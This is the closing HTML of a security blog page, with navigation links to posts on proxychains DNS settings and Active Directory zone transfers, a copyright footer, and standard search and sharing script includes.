    <div class="post-nav"><a href="/posts/2013/2013-09-10-changing-proxychains-hardcoded-dns-server/" class="prev" rel="prev" title="Changing proxychains hardcoded DNS server"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Changing proxychains hardcoded DNS server</a>
            <a href="/posts/2013/ad-zone-transfers-as-a-user/" class="next" rel="next" title="AD Zone Transfers as a user">AD Zone Transfers as a user<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
